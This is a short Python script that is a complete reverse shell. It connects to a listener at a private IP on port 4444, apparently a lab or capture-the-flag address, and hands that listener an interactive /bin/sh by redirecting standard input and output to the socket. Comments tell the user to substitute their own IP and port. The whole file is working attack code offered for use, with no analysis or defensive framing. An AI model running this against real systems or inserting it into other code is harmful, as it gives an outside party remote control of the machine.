import socket
import subprocess
import os

HOST = '10.10.14.38'  # Replace with your IP
PORT = 4444           # Match the port you're listening on

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Spawn a shell
subprocess.call(['/bin/sh', '-i'])
